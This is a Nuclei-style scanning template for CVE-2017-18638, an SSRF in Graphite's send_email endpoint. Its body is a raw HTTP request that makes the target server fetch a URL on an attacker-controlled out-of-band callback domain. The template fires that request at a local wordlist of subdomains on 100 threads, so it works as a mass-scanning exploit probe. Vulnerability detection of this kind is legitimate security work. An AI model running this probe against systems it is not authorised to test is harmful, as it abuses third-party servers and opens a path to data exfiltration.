id: CVE-2017-18638

info:
  name: Graphite 'graphite.composer.views.send_email' SSRF
  author: huowuzhao
  severity: high
  description: Graphite's send_email in graphite-web/webapp/graphite/composer/views.py in versions up to 1.1.5 is vulnerable to SSRF. The vulnerable SSRF endpoint can be used by an attacker to have the Graphite web server request any resource. The response to this SSRF request is encoded into an image file and then sent to an email address that can be supplied by the attacker. Thus, an attacker can exfiltrate any information.
  reference:
    - http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html
    - https://github.com/graphite-project/graphite-web/issues/2008
    - https://github.com/advisories/GHSA-vfj6-275q-4pvm
    - https://nvd.nist.gov/vuln/detail/CVE-2017-18638
  tags: cve,cve2017,graphite,ssrf,oob

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /composer/send_email?to={{rand_text_alpha(4)}}@{{rand_text_alpha(4)}}&url=http://{{Host}}.{{Port}}.{{Subdomains}}.2017.18638.{{MY-DOMAIN}} HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
        Accept: */*
